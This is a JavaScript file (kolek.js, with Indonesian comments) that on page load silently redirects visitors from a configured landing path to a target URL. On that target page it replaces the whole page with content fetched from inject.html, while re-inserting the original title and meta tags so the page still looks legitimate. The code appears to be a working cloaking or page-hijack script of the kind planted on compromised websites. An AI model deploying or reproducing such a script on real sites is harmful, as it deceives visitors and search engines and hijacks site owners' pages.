console.log('kolek.js is being loaded...'); // Log awal untuk memastikan file dimuat
window.onerror = (message, source, lineno, colno, error) => {
  console.error('Global error caught:', { message, source, lineno, colno, error });
};
debugger;
console.log('kolek.js script is running...');
(function () {
  console.log('Script started.'); // Log awal untuk memastikan kode dijalankan

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    console.log(`Fetching file: ${filePath}`); // Log untuk melacak file yang sedang diambil
    const response = await fetch(filePath);
    if (!response.ok) {
      console.error(`Failed to fetch ${filePath}: ${response.status}`);
      throw new Error(`Failed to fetch ${filePath}`);
    }
    const text = await response.text();
    console.log(`File fetched successfully: ${filePath}`);
    return text;
  };

  // Fungsi untuk mendapatkan tujuan akhir dari URL
  const getFinalUrl = (url) => {
    try {
      console.log(`Parsing target URL: ${url}`); // Log tambahan untuk memeriksa URL sebelum parsing
      const parsedUrl = new URL(url);
      const finalUrl = parsedUrl.searchParams.get('url'); // Ambil parameter 'url'
      console.log(`Final URL extracted: ${finalUrl || url}`); // Log tambahan untuk memeriksa URL setelah parsing
      return finalUrl ? new URL(finalUrl).href : parsedUrl.href; // Normalisasi URL
    } catch (err) {
      console.error('Error parsing URL:', url, err);
      return url; // Jika parsing gagal, kembalikan URL asli
    }
  };

  // Membaca URL dari landingpage.txt dan target.txt untuk redirect
  Promise.all([
    fetchFileContent('/landingpage.txt'),
    fetchFileContent('/target.txt'),
  ])
    .then(([landingPage, targetUrl]) => {
      console.log('All files fetched successfully for redirect.'); // Log setelah semua file berhasil diambil
      const currentPath = new URL(location.href).pathname; // Dapatkan path URL saat ini
      console.log('Current Path:', currentPath);

      // Periksa apakah URL saat ini cocok dengan landingpage.txt
      const landingPagePath = landingPage.trim();
      console.log('Landing Page Path:', landingPagePath);

      const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
      console.log(`Final target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa nilai finalTargetUrl

      if (currentPath.endsWith(landingPagePath)) {
        console.log('Current URL matches landing page. Redirecting to target URL...');
        console.log(`Redirecting to: ${finalTargetUrl}`); // Log tambahan untuk memastikan URL redirect
        location.replace(finalTargetUrl); // Redirect ke tujuan akhir
      } else {
        console.warn('Current URL does not match landing page. No redirect performed.');
      }
    })
    .catch((err) => console.error('Error loading files for redirect:', err));

  // Membaca URL dari target.txt dan metadata.txt untuk injeksi
  Promise.all([
    fetchFileContent('/target.txt'),
    fetchFileContent('/metadata.txt'), // Ambil metadata asli dari metadata.txt
  ])
    .then(([targetUrl, originalHtml]) => {
      console.log('All files fetched successfully for injection.'); // Log setelah semua file berhasil diambil
      const currentUrl = new URL(location.href).href; // Normalisasi URL saat ini

      const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
      console.log(`Final target URL for injection: ${finalTargetUrl}`); // Log tambahan untuk memeriksa nilai finalTargetUrl

      // Periksa apakah URL saat ini cocok dengan tujuan akhir dari target.txt
      if (currentUrl === finalTargetUrl) {
        console.log('Current URL matches target.txt. Injecting HTML...');
        const injectHtmlPath = '/inject.html';
        console.log(`Attempting to fetch: ${injectHtmlPath}`); // Log tambahan untuk jalur file

        fetch(injectHtmlPath)
          .then((response) => {
            if (!response.ok) {
              console.error(`Failed to load ${injectHtmlPath}:`, response.status);
              throw new Error(`Failed to load ${injectHtmlPath}`);
            }
            console.log(`${injectHtmlPath} fetched successfully.`);
            return response.text();
          })
          .then((html) => {
            document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
            console.log('HTML content injected successfully.');

            const injectMetadata = (metadata) => {
              console.log('Injecting metadata...'); // Log sebelum menyisipkan metadata
              const parser = new DOMParser();
              const doc = parser.parseFromString(metadata, 'text/html');

              // Sisipkan <title>
              const title = doc.querySelector('title');
              if (title) {
                document.title = title.textContent;
                console.log('Title injected:', title.textContent);
              }

              // Sisipkan <meta> dan <link>
              const head = document.head;
              doc.querySelectorAll('meta, link').forEach((meta) => {
                head.appendChild(meta.cloneNode(true));
                console.log('Injected meta/link:', meta.outerHTML);
              });
              console.log('Metadata injected successfully.');
            };

            injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
          })
          .catch((err) => {
            console.error('Error during HTML injection:', err);
            alert('Failed to load the required content. Please try again later.'); // Fallback untuk pengguna
          });
      } else {
        console.warn('Current URL does not match target URL. Injection skipped.');
        console.log(`Expected target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa URL yang diharapkan
        console.log(`Current URL: ${currentUrl}`); // Log tambahan untuk memeriksa URL saat ini
      }
    })
    .catch((err) => console.error('Error loading files for injection:', err));
})();